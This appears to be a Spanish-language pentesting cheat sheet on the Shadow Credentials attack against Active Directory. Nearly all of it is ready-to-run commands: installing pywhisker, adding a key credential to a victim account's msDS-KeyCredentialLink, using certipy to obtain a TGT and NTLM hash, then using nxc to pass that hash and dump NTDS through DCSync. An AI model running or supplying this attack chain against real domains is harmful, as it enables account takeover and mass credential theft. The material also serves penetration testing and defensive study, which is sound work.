# Abuso ACL 

Tags: #Linux #AD #ACL #WriteProperty #msDS-KeyCredentialLink 

##  WriteProperty sobre msDS-KeyCredentialLink (Shadow Credentials Attack)

Ataque:
	1. Crear una llave privada y pública 
	2. Colocar la llave pública sobre el objeto
	3. Me autentico con el usuario 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash 
# Instalación 
❯ git clone https://github.com/ShutdownRepo/pywhisker.git
❯ cd pywhisker
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install --upgrade pip
❯ pip install -r requirements.txt
❯ cd pywhisker
```

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
# La tool crea una llave privada, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

Notas:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
```

```bash 
# CERTIPY AUTH (funciona si PKINIT está habilitado)

# Autenticarse en el dominio generando el TGT y el NTLM HASH 
❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
	# pfx = Es el certificado que crea el comando anterior 
	# password = Es la password que muestra el comando anterior 
	# username = Es el usuario víctima 
```

```bash 
❯ nxc smb IP -u targetAccount -H NT          # Verificar 
❯ nxc smb IP -u targetAccount -H NT --ntds   # Ejecutar un DCSync si tiene los permisos 
```